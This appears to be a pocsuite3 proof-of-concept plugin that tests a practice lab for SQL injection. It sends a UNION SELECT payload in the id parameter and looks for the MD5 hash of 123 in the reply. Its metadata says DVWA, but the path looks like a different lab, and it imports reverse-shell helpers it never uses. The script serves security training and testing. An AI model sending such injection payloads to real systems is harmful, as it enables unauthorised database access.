
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from requests.exceptions import ReadTimeout

from urllib.parse import urljoin


 
class DemoPOC(POCBase):
    vulID = '11001'  
    version = '3.0'
    author = ['Polaris']
    vulDate = '2020-5-14'
    createDate = '2020-5-14'
    updateDate = '2020-5-14'
    references = ['']
    name = 'dvwa'
    appPowerLink = ''
    appName = 'dvwa '
    appVersion = '1.x'
    vulType = 'SQL'
    desc = '''
    dvwa靶场get请求SQL注入
    '''
    samples = []
    install_requires = ['']
 
    def _verify(self):
        result = {}

        payload = '/Less-1/index.php?id=10086%27union%20select%201,2,md5(123)%23'
        target = self.url+payload
        r = requests.get(target)
 
        try:
            if "202cb962ac59075b964b07152d234b70" in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url + payload
        except Exception as e:
            pass

        return self.parse_output(result)
 
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
 
    def _attack(self):
        return self._verify()
register_poc(DemoPOC)

